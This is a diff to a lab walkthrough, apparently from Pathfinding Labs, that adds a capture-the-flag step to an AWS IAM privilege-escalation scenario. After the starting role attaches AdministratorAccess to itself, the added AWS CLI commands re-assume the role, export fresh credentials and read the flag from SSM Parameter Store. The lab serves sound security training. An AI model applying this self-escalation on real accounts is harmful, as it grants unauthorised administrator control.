@@ -108,6 +108,34 @@ aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text
 
 This should succeed. You now have full administrator access operating as `pl-prod-iam-009-to-admin-starting-role`.
 
+## Capture the Flag
+
+Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now attached to the starting role provides implicitly.
+
+Because the session token you obtained via `sts:AssumeRole` earlier was issued before `AdministratorAccess` was attached, you need to re-assume the role to get a fresh session that reflects the updated policy:
+
+```bash
+ASSUME_OUTPUT=$(aws sts assume-role \
+  --role-arn "arn:aws:iam::{account_id}:role/pl-prod-iam-009-to-admin-starting-role" \
+  --role-session-name "flag-session")
+
+export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_OUTPUT" | jq -r '.Credentials.AccessKeyId')
+export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
+export AWS_SESSION_TOKEN=$(echo "$ASSUME_OUTPUT" | jq -r '.Credentials.SessionToken')
+```
+
+Now retrieve the flag:
+
+```bash
+aws ssm get-parameter \
+    --name /pathfinding-labs/flags/iam-009-to-admin \
+    --query 'Parameter.Value' \
+    --output text
+# flag{...}  — your scenario-specific flag value
+```
+
+The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.
+
 ## What Happened
 
 The attack chain was: `pl-prod-iam-009-to-admin-starting-user` → (sts:AssumeRole) → `pl-prod-iam-009-to-admin-starting-role` → (iam:AttachRolePolicy on self) → effective administrator.
